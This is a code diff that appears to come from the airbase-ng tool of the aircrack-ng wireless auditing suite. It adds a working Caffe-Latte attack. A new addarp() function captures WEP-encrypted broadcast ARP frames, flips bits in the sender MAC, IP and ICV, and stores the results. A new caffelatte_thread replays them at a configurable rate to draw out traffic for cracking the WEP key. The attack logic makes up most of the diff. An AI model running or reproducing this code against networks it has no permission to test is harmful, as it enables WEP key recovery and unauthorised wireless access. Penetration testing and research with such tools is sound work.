@@ -141,7 +141,6 @@ char usage[] =
 "\n"
 "  usage: airbase-ng <options> <replay interface>\n"
 "\n"
-// "      -x nbpps         : number of packets per second (default: 100)\n"
 "      -a bssid         : set Access Point MAC address\n"
 "      -i iface         : capture packets from this interface\n"
 // "      -y file          : read PRGA from this file\n"
@@ -158,6 +157,8 @@ char usage[] =
 "      -X               : hidden ESSID\n"
 "      -s               : force shared key auth\n"
 "      -S               : set shared key challenge length (default: 128)\n"
+"      --caffe-latte    : Caffe-Latte attack\n"
+"      -x nbpps         : number of packets per second (default: 100)\n"
 "\n"
 "  Filter options:\n"
 "      --bssid <MAC>    : BSSID to filter/use\n"
@@ -201,6 +202,10 @@ struct options
     int forceska;
     int skalen;
     int filter;
+    int caffelatte;
+    int ringbuffer;
+
+    int nb_arp;
 }
 opt;
 
@@ -278,6 +283,8 @@ char strbuf[512];
 int ctrl_c, alarmed;
 
 char * iwpriv;
+
+struct ARP_req * arp;
 
 pthread_t apid;
 
@@ -1210,7 +1217,7 @@ int intercept(uchar* packet, int length)
         if (decrypt_wep( packet + z + 4, length - z - 4,
                         K, 3 + opt.weplen ) == 0 )
         {
-            printf("ICV check failed!\n");
+//             printf("ICV check failed!\n");
             return 1;
         }
 
@@ -1362,6 +1369,67 @@ uchar* parse_tags(unsigned char *flags, unsigned char type, int length, int *tag
     return(NULL);
 }
 
+int addarp(uchar* packet, int length)
+{
+    uchar bssid[6], smac[6], dmac[6];
+    int z=0;
+
+//     printf("addarp len: %d\n", length);
+
+    if(packet == NULL)
+        return -1;
+
+//     printf("add 1\n");
+
+    if(length != 68 && length != 86)
+        return -1;
+
+//     printf("add 2 ds: %d\n", ( packet[1] & 3 ));
+    z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
+
+//     printf("add 3\n");
+    memcpy( dmac, packet + 4, 6 );
+    memcpy( bssid, packet + 10, 6 );
+    memcpy( smac, packet + 16, 6 );
+
+    if(memcmp(dmac, BROADCAST, 6) != 0)
+        return -1;
+
+//     printf("add 4\n");
+
+    if(memcmp(bssid, opt.r_bssid, 6) != 0)
+        return -1;
+
+//     printf("add 5\n");
+
+    if(opt.nb_arp >= opt.ringbuffer)
+        return -1;
+
+//     printf("mod arp\n");
+
+//     packet[1] &= 0xFC;  //clear tods, fromds
+//     packet[1] |= 0x02;  //set fromds
+
+    packet[49] ^= 0x01; //flip last bit of sender MAC
+    packet[53] ^= 0x01; //flip last bit of sender IP
+
+//     memcpy( packet + 4, BROADCAST, 6);
+//     memcpy( packet +10, bssid, 6);
+//     memcpy( packet +16, bssid, 6);
+
+    packet[length-4] ^= 0x28;
+    packet[length-3] ^= 0x04;
+    packet[length-2] ^= 0x75;
+    packet[length-1] ^= 0x78;
+
+    arp[opt.nb_arp].buf = (uchar*) malloc(length);
+    arp[opt.nb_arp].len = length;
+    memcpy(arp[opt.nb_arp].buf, packet, length);
+    opt.nb_arp++;
+//     printf("number of arps: %d", opt.nb_arp);
+    return 0;
+}
+
 int packet_recv(uchar* packet, int length, struct AP_conf *apc, int external)
 {
     uchar K[64];
@@ -1492,7 +1560,7 @@ int packet_recv(uchar* packet, int length, struct AP_conf *apc, int external)
                     if (decrypt_wep( packet + z + 4, length - z - 4,
                                     K, 3 + opt.weplen ) == 0 )
                     {
-                        printf("ICV check failed!\n");
+//                         printf("ICV check failed!\n");
                         return 1;
                     }
 
@@ -1531,7 +1599,7 @@ int packet_recv(uchar* packet, int length, struct AP_conf *apc, int external)
             {
                 /* check the extended IV flag */
                 /* WEP and we got the key */
-                if( ( packet[z + 3] & 0x20 ) == 0 && opt.crypt == CRYPT_WEP )
+                if( ( packet[z + 3] & 0x20 ) == 0 && opt.crypt == CRYPT_WEP && !opt.caffelatte )
                 {
                     memcpy( K, packet + z, 3 );
                     memcpy( K + 3, opt.wepkey, opt.weplen );
@@ -1539,7 +1607,7 @@ int packet_recv(uchar* packet, int length, struct AP_conf *apc, int external)
                     if (decrypt_wep( packet + z + 4, length - z - 4,
                                     K, 3 + opt.weplen ) == 0 )
                     {
-                        printf("ICV check failed!\n");
+//                         printf("ICV check failed!\n");
                         return 1;
                     }
 
@@ -1561,6 +1629,10 @@ int packet_recv(uchar* packet, int length, struct AP_conf *apc, int external)
                 }
                 else
                 {
+                    if(opt.caffelatte)
+                    {
+                        addarp(packet, length);
+                    }
                     /* its a packet we can't decrypt -> just replay it through the wireless interface */
                     return 0;
                 }
@@ -1850,7 +1922,7 @@ void beacon_thread( void *arg )
     while( 1 )
     {
         /* sleep until the next clock tick */
-
+//         printf( "1 " );
         if( dev.fd_rtc >= 0 )
         {
             if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )
@@ -1876,15 +1948,20 @@ void beacon_thread( void *arg )
             ticks[1] += f / ( 1000000/RTC_RESOLUTION );
             ticks[2] += f / ( 1000000/RTC_RESOLUTION );
         }
+//         printf( "2 " );
 
         if( ( (double)ticks[2] / (double)RTC_RESOLUTION )  >= ((double)apc.interval/1000.0)*(double)seq )
         {
             /* threshold reach, send one frame */
 //            ticks[2] = 0;
-
+//             printf( "ticks: %f ", ticks[2] );
+//             printf( "3 " );
+            fflush(stdout);
             gettimeofday( &tv1,  NULL );
             timestamp=tv1.tv_sec*1000000 + tv1.tv_usec;
 
+//             printf( "4 " );
+            fflush(stdout);
             //copy timestamp into beacon; a mod 2^64 counter incremented each microsecond
             for(i=0; i<8; i++)
             {
@@ -1894,6 +1971,8 @@ void beacon_thread( void *arg )
             beacon[22] = (seq << 4) & 0xFF;
             beacon[23] = (seq >> 4) & 0xFF;
 
+//             printf( "5 " );
+            fflush(stdout);
             if( send_packet( beacon, beacon_len ) < 0 )
             {
                 printf("Error sending beacon!\n");
@@ -1901,6 +1980,74 @@ void beacon_thread( void *arg )
             }
 
             seq++;
+
+//             printf( "6\n" );
+
+        }
+    }
+}
+
+void caffelatte_thread( void *arg )
+{
+    struct timeval tv, tv2;
+//     int beacon_len=0;
+//     int seq=0, i=0, n=0;
+    float f, ticks[3];
+    int arp_off1=0;
+    int nb_pkt_sent_1=0;
+    int seq=0;
+
+    if(arg) {}
+
+    ticks[0]=0;
+    ticks[1]=0;
+    ticks[2]=0;
+
+    while( 1 )
+    {
+        /* sleep until the next clock tick */
+
+        gettimeofday( &tv,  NULL );
+        usleep( 1000000/RTC_RESOLUTION );
+        gettimeofday( &tv2, NULL );
+
+        f = 1000000.0 * (float) ( tv2.tv_sec  - tv.tv_sec  )
+                    + (float) ( tv2.tv_usec - tv.tv_usec );
+
+        ticks[0] += f / ( 1000000/RTC_RESOLUTION );
+        ticks[1] += f / ( 1000000/RTC_RESOLUTION );
+        ticks[2] += f / ( 1000000/RTC_RESOLUTION );
+
+        if( ( (double)ticks[2] / (double)RTC_RESOLUTION )  >= ((double)1000.0/(double)opt.r_nbpps)*(double)seq )
+        {
+            /* threshold reach, send one frame */
+//            ticks[2] = 0;
+
+
+            if( opt.nb_arp > 0 )
+            {
+                if( nb_pkt_sent_1 == 0 )
+                    ticks[0] = 0;
+
+                if( send_packet( arp[arp_off1].buf,
+                                 arp[arp_off1].len ) < 0 )
+                    return;
+
+                nb_pkt_sent_1++;
+//                 printf("sent arp: %d\n", nb_pkt_sent_1);
+
+                if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent_1  )
+                {
+                    if( send_packet( arp[arp_off1].buf,
+                                    arp[arp_off1].len ) < 0 )
+                        return;
+
+                    nb_pkt_sent_1++;
+                }
+
+                if( ++arp_off1 >= opt.nb_arp )
+                    arp_off1 = 0;
+            }
         }
     }
 }
@@ -1937,11 +2084,13 @@ int main( int argc, char *argv[] )
     rBSSID = (pMAC_t) malloc(sizeof(struct MAC_list));
     bzero(rBSSID, sizeof(struct MAC_list));
 
-    opt.r_nbpps = 100;
-    opt.tods    = 0;
-    opt.setWEP  = -1;
-    opt.skalen  = 128;
-    opt.filter  = -1;
+    opt.r_nbpps     = 100;
+    opt.tods        = 0;
+    opt.setWEP      = -1;
+    opt.skalen      = 128;
+    opt.filter      = -1;
+    opt.ringbuffer  = 10;
+    opt.nb_arp      = 0;
 
     srand( time( NULL ) );
 
@@ -1950,21 +2099,22 @@ int main( int argc, char *argv[] )
         int option_index = 0;
 
         static struct option long_options[] = {
-            {"bssid",   1, 0, 'b'},
-            {"bssids",  1, 0, 'B'},
-            {"channel", 1, 0, 'c'},
-            {"client",  1, 0, 'd'},
-            {"clients", 1, 0, 'D'},
-            {"essid",   1, 0, 'e'},
-            {"essids",  1, 0, 'E'},
-            {"mitm",    0, 0, 'M'},
-            {"hidden",  0, 0, 'X'},
-            {"help",    0, 0, 'H'},
-            {0,         0, 0,  0 }
+            {"bssid",       1, 0, 'b'},
+            {"bssids",      1, 0, 'B'},
+            {"channel",     1, 0, 'c'},
+            {"client",      1, 0, 'd'},
+            {"clients",     1, 0, 'D'},
+            {"essid",       1, 0, 'e'},
+            {"essids",      1, 0, 'E'},
+            {"mitm",        0, 0, 'M'},
+            {"hidden",      0, 0, 'X'},
+            {"caffe-latte", 0, 0, 'L'},
+            {"help",        0, 0, 'H'},
+            {0,             0, 0,  0 }
         };
 
         int option = getopt_long( argc, argv,
-                        "a:h:i:r:w:He:E:c:d:D:f:W:qMY:b:B:XsS:",
+                        "a:h:i:r:w:He:E:c:d:D:f:W:qMY:b:B:XsS:Lx:",
                         long_options, &option_index );
 
         if( option < 0 ) break;
@@ -2026,6 +2176,18 @@ int main( int argc, char *argv[] )
             case 'X' :
 
                 opt.hidden = 1;
+
+                break;
+
+            case 'x' :
+
+                opt.r_nbpps = atoi(optarg);
+                if(opt.r_nbpps < 1 || opt.r_nbpps > 1000)
+                {
+                    printf( "Invalid speed. [1-1000]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return( 1 );
+                }
 
                 break;
 
@@ -2104,6 +2266,12 @@ int main( int argc, char *argv[] )
             case 'M' :
 
                 opt.mitm = 1;
+
+                break;
+
+            case 'L' :
+
+                opt.caffelatte = 1;
 
                 break;
 
@@ -2476,8 +2644,19 @@ usage:
     if( pthread_create( &(apid), NULL, (void *) beacon_thread,
             (void *) &apc ) != 0 )
     {
-        perror("pthread_create");
+        perror("Beacons pthread_create");
         return( 1 );
+    }
+
+    if( opt.caffelatte )
+    {
+        arp = (struct ARP_req*) malloc( opt.ringbuffer * sizeof( struct ARP_req ) );
+
+        if( pthread_create( &(apid), NULL, (void *) caffelatte_thread, NULL ) != 0 )
+        {
+            perror("Caffe-Latte pthread_create");
+            return( 1 );
+        }
     }
 
     for( ; ; )
